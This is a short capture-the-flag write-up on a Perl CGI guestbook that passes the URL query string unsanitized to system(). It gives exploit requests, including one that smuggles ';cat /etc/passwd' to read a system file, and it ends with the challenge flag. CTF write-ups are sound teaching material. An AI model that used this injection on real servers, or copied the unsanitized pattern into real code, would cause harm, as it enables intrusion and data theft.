# Guestbook — Writeup

## Vulnerability

`guestbook.pl` reads the URL query string directly and passes it to `system()`:

```perl
my $guestfile = $ENV{QUERY_STRING};
system("echo \"Welcome! This is our guestbook\"; cat $guestfile");
```

The query string is not sanitized, so any shell metacharacters are interpreted by `/bin/sh`.

## Exploitation

To read the flag file at `/flag.txt`:

```
GET /cgi-bin/guestbook.pl?/flag.txt HTTP/1.0
```

Or to run arbitrary commands (e.g., read `/etc/passwd`):

```
GET /cgi-bin/guestbook.pl?/dev/null;cat+/etc/passwd HTTP/1.0
```

## Flag

`FLAG_ICTF2002{all_your_guestbook_are_belong_to_us}`
